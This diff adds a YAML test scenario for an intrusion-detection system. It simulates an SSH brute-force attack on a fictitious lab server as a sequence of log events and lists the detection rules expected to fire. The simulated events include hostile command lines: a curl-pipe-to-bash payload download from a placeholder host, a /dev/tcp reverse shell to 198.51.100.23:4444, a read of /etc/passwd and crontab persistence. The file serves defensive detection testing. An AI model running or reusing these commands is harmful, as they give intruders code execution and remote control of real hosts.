@@ -1,0 +1,210 @@
+id: ssh-intrusion
+title: SSH brute force to persistence and lateral movement
+description: |
+  An external source (documentation range 203.0.113.0/24) brute-forces SSH on a lab web
+  server, logs in as "deploy", performs discovery, downloads a payload, establishes cron and
+  SSH-key persistence, opens a reverse shell and moves to the database host.
+  All hosts are fictitious lab machines; no command is executed anywhere.
+duration: 30m
+tags: [credential-access, persistence, command-and-control, lateral-movement]
+expected:
+  alerts_min: 8
+  rules:
+    - aegis-corr-ssh-bruteforce
+    - aegis-corr-ssh-password-spray
+    - aegis-corr-ssh-success-after-failures
+    - aegis-intel-indicator-auth
+    - aegis-corr-discovery-burst
+    - aegis-lnx-curl-pipe-shell
+    - aegis-lnx-exec-from-tmp
+    - aegis-intel-indicator-match
+    - aegis-lnx-suspicious-port
+    - aegis-lnx-ssh-authorized-keys
+    - aegis-lnx-crontab-install
+    - aegis-lnx-cron-file-write
+    - aegis-lnx-reverse-shell
+hosts:
+  web:
+    hostname: lab-web-01
+    os: Ubuntu 24.04 LTS
+    ip: [10.20.0.11]
+  db:
+    hostname: lab-db-01
+    os: Debian 12
+    ip: [10.20.0.21]
+steps:
+  # --- baseline activity -------------------------------------------------------------
+  - at: 0s
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: root, uid: 0}
+      process: {ref: sshd, name: sshd, executable: /usr/sbin/sshd, command_line: "sshd: /usr/sbin/sshd -D [listener]"}
+  - at: 0s
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: www-data, uid: 33}
+      process: {ref: nginx, name: nginx, executable: /usr/sbin/nginx, command_line: "nginx: worker process"}
+  - at: 20s
+    repeat: {count: 15, every: 2m, jitter: 20s}
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: root, uid: 0}
+      process: {name: run-parts, executable: /usr/bin/run-parts, command_line: "run-parts --report /etc/cron.hourly", parent_name: cron}
+  - at: 1m
+    event:
+      host: web
+      category: authentication
+      action: login_success
+      user: {name: ops-admin}
+      auth: {method: publickey, outcome: success, source_ip: 10.20.0.5, target_user: ops-admin, service: sshd}
+  - at: 1m30s
+    repeat: {count: 12, every: 2m30s, jitter: 30s}
+    event:
+      host: web
+      category: network
+      action: accept
+      process: {ref: nginx, name: nginx}
+      network: {direction: inbound, protocol: tcp, src_ip: "10.20.0.{{int:30-80}}", src_port: "{{int:40000-60000}}", dst_ip: host, dst_port: 443}
+  - at: 2m
+    repeat: {count: 10, every: 3m, jitter: 40s}
+    event:
+      host: db
+      category: process
+      action: start
+      user: {name: postgres, uid: 113}
+      process: {name: postgres, executable: /usr/lib/postgresql/16/bin/postgres, command_line: "postgres: autovacuum worker", parent_name: postgres}
+  # --- brute force ---------------------------------------------------------------------
+  - at: 5m
+    repeat: {count: 26, every: 6s, jitter: 2s}
+    event:
+      host: web
+      category: authentication
+      action: login_failure
+      user: {name: "{{cycle:root|admin|ubuntu|deploy|postgres|test|oracle}}"}
+      auth: {method: password, outcome: failure, source_ip: 203.0.113.45, target_user: "{{cycle:root|admin|ubuntu|deploy|postgres|test|oracle}}", service: sshd}
+  - at: 8m
+    event:
+      host: web
+      category: authentication
+      action: login_success
+      user: {name: deploy, uid: 1001}
+      auth: {method: password, outcome: success, source_ip: 203.0.113.45, target_user: deploy, service: sshd}
+  - at: 8m30s
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {ref: shell, parent: sshd, name: bash, executable: /usr/bin/bash, command_line: "-bash", working_directory: /home/deploy}
+  # --- discovery -----------------------------------------------------------------------
+  - at: 9m
+    event: {host: web, category: process, action: start, user: {name: deploy, uid: 1001},
+            process: {parent: shell, name: whoami, executable: /usr/bin/whoami, command_line: whoami}}
+  - at: 9m8s
+    event: {host: web, category: process, action: start, user: {name: deploy, uid: 1001},
+            process: {parent: shell, name: id, executable: /usr/bin/id, command_line: id}}
+  - at: 9m15s
+    event: {host: web, category: process, action: start, user: {name: deploy, uid: 1001},
+            process: {parent: shell, name: uname, executable: /usr/bin/uname, command_line: "uname -a"}}
+  - at: 9m24s
+    event: {host: web, category: process, action: start, user: {name: deploy, uid: 1001},
+            process: {parent: shell, name: cat, executable: /usr/bin/cat, command_line: "cat /etc/passwd"}}
+  - at: 9m40s
+    event: {host: web, category: process, action: start, user: {name: deploy, uid: 1001},
+            process: {parent: shell, name: sudo, executable: /usr/bin/sudo, command_line: "sudo -l"}}
+  - at: 9m50s
+    event: {host: web, category: process, action: start, user: {name: deploy, uid: 1001},
+            process: {parent: shell, name: ss, executable: /usr/bin/ss, command_line: "ss -tulpn"}}
+  # --- payload -------------------------------------------------------------------------
+  - at: 10m
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {ref: dropper, parent: shell, name: bash, executable: /usr/bin/bash, command_line: "bash -c curl -fsSL http://updates.example-cdn.test/i.sh | bash"}
+      attributes: {dns.query: updates.example-cdn.test}
+  - at: 10m20s
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {ref: implant, parent: dropper, name: kworkerd, executable: /tmp/.cache/kworkerd, command_line: "/tmp/.cache/kworkerd --quiet", hash_sha256: "{{hex:64}}"}
+  - at: 10m25s
+    event:
+      host: web
+      category: network
+      action: connect
+      user: {name: deploy, uid: 1001}
+      process: {ref: implant, name: kworkerd}
+      network: {direction: outbound, protocol: tcp, src_ip: host, src_port: 51544, dst_ip: 198.51.100.23, dst_port: 4444, state: established}
+  # --- persistence ---------------------------------------------------------------------
+  - at: 11m
+    event:
+      host: web
+      category: file
+      action: modify
+      user: {name: deploy, uid: 1001}
+      process: {ref: implant, name: kworkerd}
+      file: {path: /home/deploy/.ssh/authorized_keys, mode: "600", size: 1142}
+  - at: 11m30s
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {parent: shell, name: crontab, executable: /usr/bin/crontab, command_line: "crontab /tmp/.cache/c"}
+  - at: 11m31s
+    event:
+      host: web
+      category: file
+      action: create
+      user: {name: deploy, uid: 1001}
+      process: {name: crontab}
+      file: {path: /var/spool/cron/crontabs/deploy, mode: "600", size: 74}
+  # --- reverse shell -------------------------------------------------------------------
+  - at: 12m
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {ref: revshell, parent: implant, name: bash, executable: /usr/bin/bash, command_line: "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"}
+  - at: 12m2s
+    event:
+      host: web
+      category: network
+      action: connect
+      user: {name: deploy, uid: 1001}
+      process: {ref: revshell, name: bash}
+      network: {direction: outbound, protocol: tcp, src_ip: host, src_port: 51602, dst_ip: 198.51.100.23, dst_port: 4444, state: established}
+  # --- lateral movement ----------------------------------------------------------------
+  - at: 14m
+    event:
+      host: db
+      category: authentication
+      action: login_success
+      user: {name: deploy, uid: 1001}
+      auth: {method: publickey, outcome: success, source_ip: 10.20.0.11, target_user: deploy, service: sshd}
+  - at: 14m10s
+    event:
+      host: db
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {ref: dbshell, name: bash, executable: /usr/bin/bash, command_line: "-bash", parent_name: sshd}
+  - at: 14m20s
+    repeat: {count: 4, every: 12s}
+    event:
+      host: db
+      category: process
+      action: start
+      user: {name: deploy, uid: 1001}
+      process: {parent: dbshell, name: "{{cycle:whoami|id|hostname|ps}}", executable: "/usr/bin/{{cycle:whoami|id|hostname|ps}}", command_line: "{{cycle:whoami|id|hostname|ps aux}}"}
